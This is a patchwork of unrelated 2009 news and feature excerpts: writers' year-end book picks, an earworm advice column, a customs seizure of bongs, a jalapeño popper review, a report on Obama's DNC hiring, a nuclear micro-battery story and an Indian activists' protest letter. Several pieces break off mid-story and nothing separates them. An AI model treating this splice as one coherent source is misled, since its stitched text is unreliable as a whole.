I 'm scared for her , homesick , become thrilled as she falls in love and then , when tragedy strikes her family back in Ireland , the world has gone empty and I 'm grieving with her .
This is not the end , though .
It 's only the beginning of what becomes a choice straight out of Greek tragedy , a choice that can not be made .
What 's at risk is everything : the new world and the old , family , love , self , belonging .
I tend to like stylists , lyrical landscapes , showier stuff and I forget that the most ambitious landscape , finally , is the human heart .
Chris Mullin – writer and politician
John Campbell 's Pistols at Dawn ( Jonathan Cape ) is a masterly account of great political feuds of the past two centuries , starting with William Pitt and Charles James Fox and ending with Brown and Blair .
And something completely different was Dead I May Well Be ( Serpent 's Tail ) , part one of a gripping trilogy by Adrian McKinty , introducing Michael Forsyth , a young hoodlum escaping the troubles of Belfast only to find himself embroiled in the murky , violent underworld of New York 's Irish gangsters .
Taut , lean prose and dialogue up there with Elmore Leonard .
McKinty has n't had the attention he deserves .
Julie Myerson – novelist
I loved the energy , humour and fizz of Lorrie Moore 's A Gate at the Stairs ( Faber ) – so oddball in places that it ought not to have worked , but it did , totally .
Sarah Waters 's The Little Stranger ( Virago ) is proper , muscle - flexing storytelling – I was in awe and I just did not want it to end .
And the very first novel I read this year was Anita Brookner 's Strangers ( Fig Tree ) .
No one writes with more skill and honesty about the human condition and this book is possibly her finest .
Nigel Slater – food writer
I have been trying to read Monty Don 's The Ivington Diaries ( Bloomsbury ) in short daily segments , so that the beautifully written story of his astonishing Herefordshire garden will last all year .
I cannot bear to think I will come to the end .
Phyllida Law's Notes to My Mother - in - Law ( Fourth Estate ) is something I wolfed in one glorious bite : funny , tender and deeply touching , it is something for the Christmas stocking of anyone who has ever had to look after an elderly relative .
Robert McCrum – Observer writer
David Kynaston 's series Tales of New Jerusalem grows in confidence with each volume .
Family Britain 1951 - 57 ( Bloomsbury ) takes us back to the post - austerity world of Supermac , Suez , Kenwood mixers and the Comet that now seems like a cloudless idyll .
But the great quality of Kynaston 's astonishing research is his cool , unsentimental eye for telling anecdote – for instance , the vicious press hysteria that surrounded the hanging of Ruth Ellis .
Romola Garai – actress
The Complete Stories of JG Ballard ( published in a new edition by Norton in the US ) offers the reader a minute dissection of the human heart and mind .
It has been on my bedside table for months , as I could n't bring myself to move it ; I could n't let it go .
The Rapture by Liz Jensen ( Bloomsbury ) also got under my skin .
It is one of the very few books I have dreamed about .
It is a powerful and violent novel and also a terrifically gripping read .
Ross Raisin – novelist
I bang on about David Vann 's Legend of a Suicide ( Viking ) at the slightest opportunity , so this seems like a particularly good place to do it .
Much of the review coverage has concentrated on form – whether the book is a novel , memoir or a collection of short stories , and how our preconceptions about these things affect our reading .
Interesting as this question is , I first read the book in an unmarked dustjacket with no idea what it was and it turned out to be the most powerful and lucid piece of writing I have read for more years than just this one .
Rachel Cooke – Observer critic
Like everyone , I loved Wolf Hall ( Fourth Estate ) , but I was spooked by it , too .
The voice is so true : I have my suspicions that Hilary Mantel actually is Thomas Cromwell .
The Help by Kathryn Stockett ( Fig Tree ) is set in segregated Jackson , Mississippi , in 1962 , and it's an exciting and atmospheric story about what happens when one privileged white woman gets just a little too close to the town 's maids – the " help " of the title .
Anna Minton 's Ground Control ( Penguin ) is a short but thought - provoking polemic about 21st - century Britain , with its gated communities , its privately owned shopping centres and its " regenerated " cultural and business districts .
A book that will make you as mad as hell .
Tristram Hunt – historian
Three very important books for the intellectual regeneration of the left hit the shelves this year .
Richard Wilkinson and Kate Pickett's The Spirit Level ( Allen Lane ) delivered a statistically clinical account of the benefits of social democracy for living longer , happier and more fulfilled lives ; Susan Neiman 's Moral Clarity : A Guide for Grown - Up Idealists ( The Bodley Head ) was a powerful wake - up call for the progressive left to have some faith in its Enlightenment project ; and the great Amartya Sen provided a political route - map for delivering social justice in his compelling work , The Idea of Justice ( Allen Lane ) .
For sheer historical enjoyment there was Christian Wolmar 's Blood , Iron and Gold : How the Railways Transformed the World ( Atlantic Books ) , which chronicles the railway 's global growth with characteristic brio .
Craig Raine – poet
William Golding by John Carey ( Faber ) is a trove of astonishing new facts and a timely reminder of what a great , unflinching , unsparing , unorthodox , consistently surprising writer Golding was .
The last hundred pages of the 800 - page The Letters of TS Eliot Volume 2 1923 - 1925 ( Faber ) put us at the centre of the Eliot marriage as it detonates .
Not everything is clear .
It is an explosion after all – so , an eerie sensation of stillness , brute shock waves and the intimate dust still settling on the skin .
As he began , Rep. Phil Gingrey ( R - Ga. ) asked for the clerk to take down Grayson 's remarks -- a precursor to a complain about the tactic -- which caused the House to be adjourned for a short time .
When the House reconvened , he began reading again :
" Congressman Joe Wilson , 118 dead . "
" Is it really asking too much of us that we keep people alive ? " asked the Orlando Democrat , who rose to national attention earlier this year for suggesting the GOP wanted uninsured patients to die quickly .
" We know according to the Harvard study we will keep these people alive . "
Dear Cecil :
What 's the deal with getting a song stuck in your head ?
Why does it happen , especially if it's a song you do n't like or do n't even know well ?
Yet all you can think about is that stupid tune .
Please enlighten me ; I 'm getting really sick of " Tainted Love " running circles through my brain .
Meg
Cecil replies :
You think you ’ve got problems ?
My assistant Una claims she had the same tune running through her head off and on for 27 years .
Only after laborious research online was she able to establish what it was : a concerto by Antonio Vivaldi , which at least has some class .
Can you imagine 27 years of “ Achy Breaky Heart ” ?
As is all too often the case with the interesting parts of science , we do n’t know much about this phenomenon but we have a good name for it : earworm , a translation of the German Ohrwurm .
( Use the German if you want anyone to pay attention to you in the faculty lounge . )
People have been interested in earworms for a while now — Mark Twain used one as a plot device in his 1876 story “ A Literary Nightmare . ”
They ’re the most common type of what ’s called “ involuntary imagery , ” sounds , pictures , smells , and even tastes that repeatedly come to mind unbidden .
One theory is that earworms are a form of mild musical hallucination ( normally a rare experience ) , the distinction being that with an earworm you ( a ) usually are n’t on drugs or suffering from schizophrenia and thus ( b ) are fully aware there ’s no actual music being played outside of your skull .
Another theory is that earworms are a side effect of your brain trying to consolidate memories , akin to what happens in REM sleep .
Yet another possibility is pondered by neurologist Oliver Sacks in his book Musicophilia : earworms might simply be a consequence of our being surrounded by music in our lives whether we want to be or not .
A more promising line of investigation in my opinion is to focus on the earworminess of particular songs .
Una contacted the office of James Kellaris , a professor of marketing at the University of Cincinnati who ’s styled himself “ Dr. Earworm ” after years studying the subject , to learn more about a theory of his known as “ cognitive itch . ”
According to Kellaris , “ certain pieces of music may have properties that excite an abnormal reaction in the brain ” — in other words , your brain detects something extraordinary or unusual about the music that compels attention .
Your brain tries to process the itch by repeating it , which only makes things worse — not unlike an epidermal itch .
Kellaris finds the music most likely to cause an earworm has one or more of three key qualities : repetitiveness , simplicity , and what he calls incongruity , often an unexpected rhythmic variation .
One example he gives is the song “ America ” from West Side Story , which features a repetitive melody and shifting time signatures .
A 2003 study by Kellaris showed that nearly 98 percent of people experienced earworms , usually involving sung rather than instrumental tunes .
( Una ’s Vivaldi was a relative rarity , obviously indicating her superior intellect . )
While women and men experienced earworms equally often , women had to put up with them for longer and were more likely to be peeved .
Kellaris ’s research also suggests that musicians and those inclined to worry are particularly susceptible to worm attacks .
In the early 1980s Chicago parking garage bigwig Myron Warshauer used earworms as the basis of a patented “ musical theme floor reminder system , ” in which a different well - known song plays in each floor ’s elevator lobby .
When you come back hours later and can’t remember what floor you parked on , all you have to do is pay attention to the tune that ’s ( theoretically ) still running through your head — the song titles are listed opposite the buttons in the elevators .
Despite all this , no one really knows what causes earworms or how to get rid of them .
Common removal techniques include replacing the tune with a different one , trying to distract oneself with something else , listening to the piece in question , talking to others about the earworm , or just waiting the worm out .
In an unscientific poll on the Straight Dope Message Board , more than half of 91 respondents reported experiencing earworms daily , with popular music by far the most common culprit .
About half could get rid of an earworm only by putting something else in its place ; 30 percent said nothing worked reliably .
Another survey of 286 people found earwormants typically had heard the song three times or more just before the earworm set in and were in a “ neutral to positive emotional state ” but alone and bored .
So avoid ennui , my friends .
That ’s when the earworms strike .
A final infobit : A 2005 survey found 7.5 percent of respondents were inflicted by their least favorite song as an earworm , and more than a third hated the song ’s lyrics more than anything else about it .
The most loathed tune ?
No surprise here : Billy Ray Cyrus ’s “ Achy Breaky Heart . ”

Customs officials at the Los Angeles Harbor received a shipment from China listed as Christmas ornaments .
But when they opened the " presents " Tuesday , they found 316,000 bongs and pipes .
“ They ’re very colorful and big , ” said Cristina Gamez , a spokeswoman for U.S. Customs and Border Protection .
“ Some of them are like 2 feet tall . ”
Gamez said glass bongs and pipes , contained in nearly 860 boxes of cargo , are worth about $ 2.6 million .
The package arrived a month ago but was seized Tuesday at the Los Angeles / Long Beach port complex .
The manifest listing the cargo ’s contents said Christmas ornaments were inside .
They were addressed to someone in L.A. County .
Gamez said no arrests have been made , and an investigation is pending .
She said that it is illegal to import , export or sell drug paraphernalia in the United States and that all the items would be destroyed .

A long - time Apple software developer from Sydney fears he may have to lay off most of his staff after draconian Apple legal threats and a rare personal email from Apple chief executive officer Steve Jobs .
Mathew Peterson , 25 , has been creating Mac software since he was 17 and one of his most popular products has been " iPodRip " , which allows people to back up their music collections from their iPods on to their computers .
Steve Jobs .
It was an instant hit and particularly useful in emergencies because , if a user 's computer dies and they attempt to connect their iPod to their new machine , all music and videos on the device are usually wiped .
Peterson 's Manly - based company , The Little App Factory , now employs eight staff members , makes two other Apple - related software tools and claims to have approximately 6 million customers .
But iPodRip , which sells for $ US19.95 , pulls in the lion 's share of revenue .
" Drummond says she 's caught her guests stuffing these little guys into their purses . "
Jalapeño poppers have no redeeming nutritional value , no cult following ( at least not one I am aware of ) , and are n't exactly the classiest of foods .
But I love them , shamelessly .
I have been known to make secret late - night pilgrimages to the Jack in the Box drive - thru solely to obtain these nasty little treats ( with extra ranch dressing , of course ) .
I 'm even guilty of buying the frozen supermarket version in dire times .
So you can only imagine my joy when I found the first recipe in Ree Drummond 's The Pioneer Woman Cooks was for BBQ Jalapeño Poppers .
For years I 'd been wanting to make them at home and now was my chance !
And the best part , this recipe does n't force you to choose between stuffing the poppers with either cream cheese or cheddar — it calls for both .
Armed with a bag of jalapeños , a pound of bacon , blocks of cheddar and cream cheese , I headed into the kitchen .
Throwing caution to the wind , I halved and seeded my peppers without the protective aid of rubber gloves .
Sure , my fingers tingled a bit , but I 'll chalk it up to nervous excitement .
I mixed the cheeses and scallions , stuffed the peppers and lovingly wrapped each one in bacon .
I 'm not a big fan of store - bought barbecue sauce and decided to go with the only jam that happened to be in my fridge , Damson plum .
Strange choice , I know , but it worked out pretty well .
I placed my swaddled peppers in the oven and let them bake for a little over an hour .
The low - and - slow cooking meant that the peppers cooked through without becoming soggy , the cheeses heated evenly without oozing out of their shells , and the bacon was crisp and caramelized with a hint of sweetness from the jam .
I took them out of the oven and against my better judgment , popped a still - steaming and sizzling popper straight into my mouth .
Did I burn my mouth ?
Of course .
Was it totally worth it ?
Yes , there are no words to describe the deliciousness of these homemade jalapeño poppers .
I ate an embarrassing amount of them at temperatures ranging from mouth - scorching to hot , warm , room temperature , and even downright cold .
Drummond says she 's caught her guests stuffing these little guys into their purses and I can see why .
There are few hors d'oeuvres that have the potential to turn regularly honest people into petty thieves .
A new batch of spending reports reveals an unprecedented transformation of Tim Kaine 's DNC under Barack Obama .
In his own image : Obama's DNC
The Democratic National Committee , often relatively inactive in the year after a presidential election , is ramping up its hiring and aggressively broadening its mission under the direction of Obama campaign veterans intent on applying the lessons of 2008 to races in 2010 and 2012 .
Virginia Governor Tim Kaine , the DNC chairman installed in January by President Barack Obama , has hired many of the top staffers , pollsters , ad makers and fundraisers who helped steer the Obama campaign , completing a takeover of the party machinery that began when Obama became the Democratic nominee 14 months ago .

A POLITICO analysis of Federal Election Commission records found that since the beginning of the year , the committee has paid at least $ 5.9 million to staffers and firms that worked on the campaign – but had little to no independent history with the DNC – to do a range of work that will boost the party as a whole , and also lay the foundation for Obama ’s reelection campaign .
Financed in part by money left over from Obama ’s record - breaking fund - raising operation , the DNC has built a staff of about 380 employees across the country – a hiring pace that puts it on track to far surpass the staffs assembled by Kaine ’s predecessors .
The lion ’s share of the hiring is to support a new organizing project called Organizing for America ( echoing the name of his presidential campaign , Obama for America ) created within the committee to perpetuate the grassroots mobilization that played a key role in Obama ’s capture of the White House .
The project acts as the custodian for the campaign ’s 13 - million email address list .
Paul Begala , who became a DNC consultant after helping guide Bill Clinton to victory in the 1992 presidential campaign , said Obama has earned the right to remake the DNC in his image .
“ Yes , this is an Obama - centered DNC , ” he said , “ but it ought to be .
To the winner goes the spoils . ”
In the months after Clinton ’s 1992 election victory , the DNC had more than 200 employees but was aggressively paring down its payroll , according to Bobby Watson , a top committee official in Clinton ’s early years .
“ I had to get rid of close to 100 people , ” Watson recalled .
Former DNC chairman Howard Dean caught some flak from Democrats for trying to buck that trend after taking over in the months after former President Bush ’s 2004 reelection victory over Democratic nominee John Kerry .
The former Vermont governor , who had challenged Kerry for the Democratic nomination , began hiring staff to work around the cycle – and around the country – on an ambitious initiative called the “ 50 States Strategy , ” intended to put traditionally Republican states in play in 2006 and 2008 – an effort continued by Obama ’s campaign that stretched the inferior resources of his Republican opponent , John McCain .
Organizing for America , which is still hiring staffers in the states , is based on a similar idea as Dean ’s project .
But FEC reports covering September 2005 show that Dean ’s DNC had only 217 staffers at a comparable point in his tenure as chairman .
Tom McMahon , who worked on Dean ’s presidential campaign and then became DNC executive director when he was chairman , said Obama ’s DNC “ has been effective at moving more quickly in the hiring process ” because it had a “ willing work force of organizers and volunteers who were already schooled in the Obama way of organizing , ” as well as more money .
“ They were able to hit the ground running faster and they hit the ground running with cash in the bank . ”
That ’s thanks in no small part to Obama ’s record - shattering campaign fundraising operation , which in some ways reversed the traditional dynamic in which presidential nominees are dependent on their national parties ’ resources .
To be sure , after securing the nomination , Obama did integrate the committee ’s voter file and field workers into his campaign ’s state operations , and also installed Paul Tewes , a top staffer , at the DNC to begin the overhaul .
But unlike previous nominees , Obama , whose campaign raised $ 750 million , had plenty of cash left over after Election Day – $ 18 million at the end of the year – allowing him to keep the DNC closer than usual in the cash race to the traditionally better - funded Republican National Committee .
This year , the Obama campaign has given nearly $ 5 million to the DNC , both by writing checks and picking up the tab for all manner of expenses , including ads and travel ( it even donated the unused miles racked up during the campaign to the DNC ) , bringing the committee within $ 7 million of the $ 62 million raised by the RNC .
The cash has helped pay a DNC staff led by McMahon ’s replacement as executive director , Jennifer O'Malley - Dillon , who oversaw Obama ’s field operation , as well as finance director Rufus Gifford , whose California - based fundraising firm raised tens of millions of dollars for the campaign , and Organizing for America honchos Mitch Stewart and Jeremy Bird , who helped lead the Obama campaign ’s efforts in Virginia and Ohio , respectively .
The DNC has made big payments to key Obama consultants , including Obama ’s top campaign pollsters : Joel Benenson , David Binder and Paul Harstad .
Their three firms had not collected a dime from the DNC between 2002 and the time Obama secured the presidential nomination , but have raked in a combined $ 2.2 million for polling work this year .
Another $ 376,000 in payments went to the ad firm credited with developing Obama ’s messaging and media campaign , AKPD Message and Media , which was founded by Obama political guru David Axelrod , who steered campaign strategy and – since taking a top White House job – has convened weekly political messaging meetings with his former partners at the firm , as well as O'Malley - Dillon , Benenson and other DNC consultants .
Team Obama even installed its own lawyer at the DNC , replacing longtime general counsel Joe Sandler with Bob Bauer , an Obama insider who is married to White House communications director Anita Dunn , another participant in the weekly political meeting .
Bauer ’s firm has pulled in $ 306,000 in legal fees from the DNC this year .
His hiring caused some grumbling among Democratic loyalists , who were upset to see Sandler go .
Other party faithful have complained that Obama ’s team is over - reaching by deploying Organizing for America in the states to lobby lawmakers – including Democrats – to back the president ’s legislative agenda .
A number of state party chairs “ were not , frankly , overly enthused by the plans to unleash OFA across the country , ” Rhode Island Democratic Party Chairman Bill Lynch wrote in a letter sent this month to other party leaders .
He argues that much of OFA ’s portfolio should be left to state parties .
DNC press secretary Hari Sevugan , himself a former Obama campaign spokesman , called OFA “ an unprecedented effort in the history of any party committee ” and said it required the staffing boost reflected in the DNC ’s financial reports .
But he stressed that OFA ’s mission “ is not about looking forward to the next election .
It ’s about following through on the last election . ”
The line is sometimes blurry , however .
For example , at the DNC , Sevugan blasts out emails to reporters highlighting the committee ’s efforts to help enact healthcare reform and elect Democrats to lower offices , but also acerbically ripping potential 2012 GOP presidential candidates like Mitt Romney , Tim Pawlenty and Sarah Palin .
Then there are the legions of mostly young Obama devotees around the country who worked low - paying jobs on his campaign and have transitioned to new low - paying jobs for Organizing for America .
Though OFA boasts they ’ve organized thousands of house parties around the country to rally support for Obama ’s agenda , turned out Democrats to counter angry Obama opponents at this summer ’s raucous town hall meetings and generated 300,000 phone calls to congressional offices supporting Obama ’s healthcare plan , organizers for the group have also been instructed to focus on Obama ’s 2012 reelection , according to a former regional director , Jeremiah Anderson .
“ Even in the midst of training , they were asking us to start thinking about 2011 and what our areas would look like then , ” said Anderson , 28 , who left the job last month to attend to family issues and eventually return to school .
“ I thought that was cool , because I ’m not that big of a fan of advocacy .
I ’d much rather work for a candidate . ”
But Begala cautions that 2012 is still three years away .
“ Re-electing President Obama is ultimately somewhere on the mind of everyone at the DNC , but job one is 2010 , ” he said .

Batteries can power anything from small sensors to large systems .
While scientists are finding ways to make them smaller but even more powerful , problems can arise when these batteries are much larger and heavier than the devices themselves .
University of Missouri researchers are developing a nuclear energy source that is smaller , lighter and more efficient .
" To provide enough power , we need certain methods with high energy density , " said Jae Kwon , assistant professor of electrical and computer engineering at MU .
" The radioisotope battery can provide power density that is six orders of magnitude higher than chemical batteries . "
Kwon and his research team have been working on building a small nuclear battery , currently the size and thickness of a penny , intended to power various micro / nanoelectromechanical systems ( M / NEMS ) .
Although nuclear batteries can pose concerns , Kwon said they are safe .
" People hear the word ' nuclear ' and think of something very dangerous , " he said .
" However , nuclear power sources have already been safely powering a variety of devices , such as pace - makers , space satellites and underwater systems . "
His innovation is not only in the battery 's size , but also in its semiconductor .
Kwon 's battery uses a liquid semiconductor rather than a solid semiconductor .
" The critical part of using a radioactive battery is that when you harvest the energy , part of the radiation energy can damage the lattice structure of the solid semiconductor , " Kwon said .
" By using a liquid semiconductor , we believe we can minimize that problem . "
Kwon has been collaborating with J. David Robertson , chemistry professor and associate director of the MU Research Reactor , and is working to build and test the battery at the facility .
In the future , they hope to increase the battery 's power , shrink its size and try with various other materials .
Kwon said that the battery could be thinner than the thickness of human hair .
They 've also applied for a provisional patent .
Kwon 's research has been published in the Journal of Applied Physics Letters and Journal of Radioanalytical and Nuclear Chemistry .

Adivasi women protest in West Bengal .
October 14 , 2009 -- Sanhati is a collective of activists / academics who have been working in solidarity with peoples ' movements in India by providing information and analysis ( see http://www.sanhati.com).
We have been profoundly disturbed by the Indian government 's reported plans to launch an unprecedented military offensive in the huge forested regions of central India , populated by millions of Indigenous tribes ( adivasis ) , for stamping out an alleged Maoist insurgency .
We feel that this will be a democratic and humanitarian disaster .
Hence we have taken the initiative , in consultation with progressive intellectuals , to draft a statement of protest against the Indian government 's military offensive and have circulated it among democratic and peace - loving citizens of India and the world for endorsement .
Below is the statement , the list of signatories ( which includes many eminent intellectuals / academics ) and a background note which puts the current conflict into perspective .
* * *
To Dr. Manmohan Singh Prime Minister ,
Government of India ,
South Block , Raisina Hill , New Delhi ,
India - 110 011 .
We are deeply concerned by the Indian government 's plans for launching an unprecedented military offensive by army and paramilitary forces in the adivasi ( Indigenous people ) populated regions of Andhra Pradesh , Chattisgarh , Jharkhand , Maharashtra , Orissa and West Bengal states .
The stated objective of the offensive is to " liberate " these areas from the influence of Maoist rebels .
Such a military campaign will endanger the lives and livelihoods of millions of the poorest people living in those areas , resulting in massive displacement , destitution and human rights violation of ordinary citizens .
To hunt down the poorest of Indian citizens in the name of trying to curb the shadow of an insurgency is both counterproductive and vicious .
The ongoing campaigns by paramilitary forces , buttressed by anti-rebel militias , organised and funded by government agencies , have already created a civil war like situation in some parts of Chattisgarh and West Bengal , with hundreds killed and thousands displaced .
The proposed armed offensive will not only aggravate the poverty , hunger , humiliation and insecurity of the adivasi people , but also spread it over a larger region .
Grinding poverty and abysmal living conditions that has been the lot of India ’s adivasi population has been complemented by increasing state violence since the neoliberal turn in the policy framework of the Indian state in the early 1990s .
Whatever little access the poor had to forests , land , rivers , common pastures , village tanks and other common property resources has come under increasing attack by the Indian state in the guise of Special Economic Zones ( SEZs ) and other " development " projects related to mining , industrial development , information technology parks , etc .
The geographical terrain , where the government 's military offensive is planned to be carried out , is very rich in natural resources like minerals , forest wealth and water , and has been the target of large - scale appropriation by several corporations .
The desperate resistance of the local Indigenous people against their displacement and dispossession has in many cases prevented the government - backed corporations from making inroads into these areas .
We fear that the government 's offensive is also an attempt to crush such popular resistances in order to facilitate the entry and operation of these corporations and to pave the way for unbridled exploitation of the natural resources and the people of these regions .
It is the widening levels of disparity and the continuing problems of social deprivation and structural violence , and the state repression on the non-violent resistance of the poor and marginalised against their dispossession , which gives rise to social anger and unrest and takes the form of political violence by the poor .
Instead of addressing the source of the problem , the Indian state has decided to launch a military offensive to deal with this problem : kill the poor and not the poverty , seems to be the implicit slogan of the Indian government .
We feel that it would deliver a crippling blow to Indian democracy if the government tries to subjugate its own people militarily without addressing their grievances .
Even as the short - term military success of such a venture is very doubtful , enormous misery for the common people is not in doubt , as has been witnessed in the case of numerous insurgent movements in the world .
We urge the Indian government to immediately withdraw the armed forces and stop all plans for carrying out such military operations that has the potential for triggering a civil war which will inflict widespread misery on the poorest and most vulnerable section of the Indian population and clear the way for the plundering of their resources by corporations .
We call upon all democratic - minded people to join us in this appeal .

It has been widely reported in the press that the Indian government is planning an unprecedented military offensive against alleged Maoist rebels , using paramilitary and counter - insurgency forces , possibly the Indian armed forces and even the Indian air force .
This military operation is going to be carried out in the forested and semi-forested rural areas of the states of Andhra Pradesh , Chhattisgarh , Jharkhand , West Bengal and Maharashtra , populated mainly by the tribal ( Indigenous ) people of India .
Reportedly , the offensive has been planned in consultation with US counterinsurgency agencies .
To put the Indian government ’s proposed military offensive in proper perspective one needs to understand the economic , social and political background to the conflict .
In particular , there are three dimensions of the crisis that needs to be emphasised , because it is often overlooked : ( a ) the development failure of the post - colonial Indian state , ( b ) the continued existence and often exacerbation of the structural violence faced by the poor and marginalised , and ( c ) the full - scale assault on the meagre resource base of the peasantry and the tribal ( Indigenous people ) in the name of “ development ” .
Let us look at each of these in turn , but before we do so it needs to be stressed that the facts we mention below are not novel ; they are well known if only conveniently forgotten .
Most of these facts were pointed out by the April 2008 Report of the Expert Group of the Planning Commission of the Indian Government ( headed by retired civil servant D. Bandopadhyay ) to study “ development challenges in extremist - affected areas ” .
The post - colonial Indian state , both in its earlier Nehruvian and the more recent neoliberal variant , has failed miserably to solve the basic problems of poverty , employment and income , housing , primary health care , education and inequality and social discrimination of the people of the country .
The utter failure of the development strategy of the post - colonial state is the ground on which the current conflict arises .
To recount some well - known but oft - forgotten facts , recall that about 77 percent of the Indian population in 2004 - 05 had a per capita daily consumption expenditure of less than Rs. 20 ; that is less than 50 cents by the current nominal exchange rate between the rupee and the US dollar and about US $ 2 in purchasing power parity terms .
According to the 2001 census , even 62 years after political independence , only about 42 per cent of Indian households have access to electricity .
About 80 per cent of the households do not have access to safe drinking water ; that is a staggering 800 million people lacking access to potable water .
What is the condition of the working people in the country ?
Ninety - three percent of the workforce , the overwhelming majority of the working people in India , are what the National Commission for Enterprises in the Unorganised Sector ( NCEUS ) called “ informal workers ” ; these workers lack any employment security and social security .
About 58 per cent of them work in the agricultural sector and the rest is engaged in manufacturing and services .
Wages are very low and working conditions extremely onerous , leading to persistent and deep poverty , which has been increasing over the last decade and a half in absolute terms : the number of what the National Commission for Enterprises in the Unorganised Sector ( NCEUS ) called the “ poor and vulnerable ” increased from 811 million in 1999 - 00 to 836 million in 2004 - 05 .
Since majority of the working people still work in the agricultural sector , the economic stagnation in agriculture is a major cause for the continued poverty of the vast majority of the people .
Since the Indian state did not undertake land reforms in any meaningful sense , the distribution of land remains extremely skewed to this day .
Close to 60 per cent of rural households are effectively landless ; and extreme economic vulnerability and despair among the small and marginal peasantry has resulted in the largest wave of suicides in history : between 1997 and 2007 , 182,936 farmers committed suicide .
This is the economic setting of the current conflict .
But in this sea of poverty and misery , there are two sections of the population that are much worse off than the rest : the Scheduled Caste ( SC ) and Scheduled Tribes ( ST ) population .
On almost all indicators of social wellbeing , the SCs and STs are worse off than the general population : poverty rates are higher , landlessness is higher , infant mortality rates are higher , levels of formal education are lower , and so on .
To understand this differential in social and economic deprivation we need to look at the second aspect of the current crisis that we had alluded to : structural violence .
There are two dimensions of this structural violence : ( a ) oppression , humiliation and discrimination along the lines of caste and ethnicity and ( b ) regular harassment , violence and torture by arms of the state .
For the SC and ST population , therefore , the violence of poverty , hunger and abysmal living conditions has been complemented and worsened by the structural violence that they encounter daily .
It is the combination of the two , general poverty and the brutality and injustice of the age - old caste system , kept alive by countless social practices despite numerous legislative measures by the Indian state , that makes this the most economically deprived and socially marginalised section of the Indian population .
This social discrimination , humiliation and oppression is of course very faithfully reflected in the behaviour of the police and other law - enforcement agencies of the state towards the poor SC and ST population , who are constantly harassed , beaten up and arrested on the slightest pretext .
For this population , therefore , the state has not only totally neglected their economic and social development , it is an oppressor and exploiter .
While the SC and ST population together account for close to a quarter of the Indian population , they are the overwhelming majority in the areas where the Indian government proposes to carry out its military offensive against alleged Maoist rebels .
This , then , is the social background of the current conflict .
This brings us to the third dimension of the problem : unprecedented attack on the access of the marginalised and poor to common property resources .
Compounding the persistent poverty and the continuing structural violence has been the state ’s recent attempt to usurp the meagre resource base of the poor and marginalised , a resource base that was so far largely outside the ambit of the market .
The neoliberal turn in the policy framework of the Indian state since the mid 1980s has , therefore , only further worsened the problems of economic vulnerability and social deprivation .
Whatever little access the poor had to forests , land , rivers , common pastures , village tanks and other common property resources to cushion their inevitable slide into poverty and immiserisation has come under increasing attack by the Indian state in the guise of so - called development projects : Special Economic Zones ( SEZs ) and other “ development ” projects related to mining , industrial development , information technology parks , etc .
Despite numerous protests from people and warnings from academics , the Indian state has gone ahead with the establishment of 531 SEZs .
The SEZs are areas of the country where labour and tax laws have been consciously weakened , if not totally abrogated by the state to “ attract ” foreign and domestic capital ; SEZs , almost by definition , require a large and compact tract of land , and thus inevitably mean the loss of land , and thus livelihood , by the peasantry .
To the best of our knowledge , there have been no serious , rigorous cost - benefit analysis of these projects to date ; but this does not prevent the government from claiming that the benefits of these projects , in terms of employment generation and income growth , will far outweigh the costs of revenue loss from foregone taxes and lost livelihoods due to the assault on land .
The opposition to the acquisition of land for these SEZ and similar projects have another dimension to it .
Dr Walter Fernandes , who has studied the process of displacement in post - independence India in great detail , suggests that around 60 million people have faced displacement between 1947 and 2004 ; this process of displacement has involved about 25 million hectares of land , which includes 7 million hectares of forests and 6 million hectares of other common property resources .
How many of these displaced people have been resettled ?
Only one in every three .
Thus , there is every reason for people not to believe the government ’s claims that those displaced from their land will be , in any meaningful sense , resettled .
This is one of the most basic reasons for the opposition to displacement and dispossession .
But , how have the rich done during this period of unmitigated disaster for the poor ?
While the poor have seen their incomes and purchasing power tumble down precipitously in real terms , the rich have , by all accounts , prospered beyond their wildest dreams since the onset of the liberalisation of the Indian economy .
There is widespread evidence from recent research that the levels of income and wealth inequality in India has increased steadily and drastically since the mid 1980s .
A rough overview of this growing inequality is found by juxtaposing two well - known facts : ( a ) in 2004 - 05 , 77 per cent of the population spent less than Rs. 20 a day on consumption expenditure ; and ( b ) according to the annual World Wealth Report released by Merrill Lynch and Capgemini in 2008 , the millionaire population in India grew in 2007 by 22.6 per cent from the previous year , which is higher than in any other country in the world .
It is , thus , the development disaster of the Indian state , the widening levels of disparity and the continuing problems of social deprivation and structural violence when compounded by the all - out effort to restrict access to common property resources that , according to the Expert Group of the Planning Commission , give rise to social anger , desperation and unrest .
In almost all cases the affected people try to ventilate their grievances using peaceful means of protest : processions , sit - down demonstrations , petitions .
The response of the state is remarkably consistent in all these cases : it cracks down on the peaceful protesters , sends in armed goons to attack the people , slaps false charges against the leaders and arrests them and often also resorts to police shootings and violence to terrorise the people .
We only need to remember Singur , Nandigram , Kalinganagar and countless other instances where peaceful and democratic forms of protest were crushed by the state with ruthless force .
It is , thus , the action of the state that blocks off all forms of democratic protest and forces the poor and dispossessed to take up arms to defend their rights , as has been pointed out by social activists like Arundhati Roy .
The Indian government ’s proposed military offensive will repeat that story all over again .
Instead of addressing the source of the conflict , instead of addressing the genuine grievances of the marginalised people along the three dimensions that we have pointed to , the Indian state seems to have decided to opt for the extremely myopic option of launching a military offensive .
It is also worth remembering that the geographical terrain , where the government ’s military offensive is planned , is very well endowed with natural resources like minerals , forest wealth , biodiversity and water resources , and has of late been the target of systematic usurpation by several large , both Indian and foreign , corporations .
So far , the resistance of the local Indigenous people against their displacement and dispossession has prevented the government - backed corporates from exploiting the natural resources for their own profits and without regard to ecological and social concerns .
We fear that the government ’s offensive is also an attempt to crush such democratic and popular resistance against dispossession and impoverishment ; the whole move seems to be geared towards facilitating the entry and operation of these large corporations and paving the way for unbridled exploitation of the natural resources and people of these regions .

On Thursday afternoon , Thomas gave a clinic in fortitude to President Obama 's spokesman , Robert Gibbs , during the briefing .
" Has the president given up on the public option ? " she inquired from her front - row - middle seat .
The press secretary laughed at this repetition of a common Thomas inquiry , but this questioner , who has covered every president since Kennedy , was n't about to be silenced .
" I ask it day after day because it has great meaning in this country , and you never answer it , " she said .
" Well , I -- I -- I apparently do n't answer it to your satisfaction , " Gibbs stammered .
" That 's right , " Thomas snarled .
" I -- I 'll -- I 'll give you the same answer that I gave you unsatisfactorily for many of those other days , " Gibbs offered .
" It 's what the president believes in --"
" Is he going to fight for it or not ? "
Thomas snapped .
" We 're going to work to get choice and competition into health - care reform " was Gibbs 's vague response .
Thomas took that as a no .
" You 're not going to get it , " she advised .
" Then why do you keep asking me ? " Gibbs inquired .
" Because I want your conscience to bother you , " Thomas replied .
The room erupted ; Gibbs reddened .
I so want to be Helen Thomas when I grow up :
